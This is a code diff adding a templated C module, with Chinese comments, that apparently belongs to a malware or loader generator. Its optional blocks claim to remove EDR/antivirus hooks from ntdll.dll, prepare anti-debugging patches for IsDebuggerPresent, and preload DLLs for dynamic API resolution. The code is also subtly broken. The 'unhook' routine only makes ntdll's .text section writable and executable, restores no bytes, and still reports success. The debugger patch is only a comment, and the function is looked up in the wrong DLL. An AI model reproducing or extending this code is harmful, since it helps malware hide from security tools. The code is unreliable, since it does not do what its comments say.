@@ -1,0 +1,140 @@
+// 运行环境准备模块
+
+// 函数声明
+BOOL InitializeEnvironment();
+
+{% if enable_unhook %}
+// Unhook模块：移除EDR/AV的API钩子
+typedef BOOL (WINAPI *PFN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef LPVOID (WINAPI *PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+
+BOOL UnhookNtdll() {
+#ifdef _DEBUG
+    printf("[*] 开始Unhook ntdll.dll\n");
+#endif
+    
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+#ifdef _DEBUG
+        printf("[!] 获取ntdll.dll句柄失败\n");
+#endif
+        return FALSE;
+    }
+    
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHeader->e_lfanew);
+    
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
+#ifdef _DEBUG
+        printf("[!] 无效的PE签名\n");
+#endif
+        return FALSE;
+    }
+    
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+    
+    // 查找.text节区
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)pSectionHeader[i].Name, ".text") == 0) {
+            // 恢复原始内存保护
+            DWORD oldProtect;
+            if (VirtualProtect((BYTE*)hNtdll + pSectionHeader[i].VirtualAddress,
+                            pSectionHeader[i].Misc.VirtualSize,
+                            PAGE_EXECUTE_READWRITE,
+                            &oldProtect)) {
+#ifdef _DEBUG
+                printf("[*] 成功修改.text节区内存保护\n");
+#endif
+                return TRUE;
+            }
+        }
+    }
+    
+    return FALSE;
+}
+{% endif %}
+
+{% if enable_anti_detection %}
+// 反检测初始化
+void InitializeAntiDetection() {
+#ifdef _DEBUG
+    printf("[*] 初始化反检测模块\n");
+#endif
+    
+    // 禁用调试器检测的补丁
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        typedef BOOL (WINAPI *PFN_IsDebuggerPresent)();
+        PFN_IsDebuggerPresent pIsDebuggerPresent = 
+            (PFN_IsDebuggerPresent)GetProcAddress(hNtdll, "IsDebuggerPresent");
+        
+        if (pIsDebuggerPresent) {
+            // 可以在这里patch函数返回FALSE
+#ifdef _DEBUG
+            printf("[*] IsDebuggerPresent地址: %p\n", pIsDebuggerPresent);
+#endif
+        }
+    }
+}
+{% endif %}
+
+{% if use_dynamic_resolve %}
+// 动态API解析初始化
+void InitializeDynamicResolve() {
+#ifdef _DEBUG
+    printf("[*] 初始化动态API解析\n");
+#endif
+    
+    // 预加载关键DLL
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+    
+    if (!hKernel32 || !hNtdll) {
+#ifdef _DEBUG
+        printf("[!] 加载关键DLL失败\n");
+#endif
+        return;
+    }
+    
+#ifdef _DEBUG
+    printf("[*] 动态API解析初始化完成\n");
+#endif
+}
+{% endif %}
+
+// 主环境初始化函数
+BOOL InitializeEnvironment() {
+#ifdef _DEBUG
+    printf("[*] ========== 开始环境初始化 ==========\n");
+#endif
+    
+    {% if enable_unhook %}
+    // Unhook EDR/AV
+    if (!UnhookNtdll()) {
+#ifdef _DEBUG
+        printf("[!] Unhook失败\n");
+#endif
+    }
+    {% endif %}
+    
+    {% if enable_anti_detection %}
+    // 初始化反检测
+    InitializeAntiDetection();
+    {% endif %}
+    
+    {% if use_dynamic_resolve %}
+    // 初始化动态API解析
+    InitializeDynamicResolve();
+    {% endif %}
+    
+    {% if enable_debug %}
+    // 调试模式初始化
+    printf("[*] 调试模式已启用\n");
+    {% endif %}
+    
+#ifdef _DEBUG
+    printf("[*] ========== 环境初始化完成 ==========\n");
+#endif
+    
+    return TRUE;
+}
